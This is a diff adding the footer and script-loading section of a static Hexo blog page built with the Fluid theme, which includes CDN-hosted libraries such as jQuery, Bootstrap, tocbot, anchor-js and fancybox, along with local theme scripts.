+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
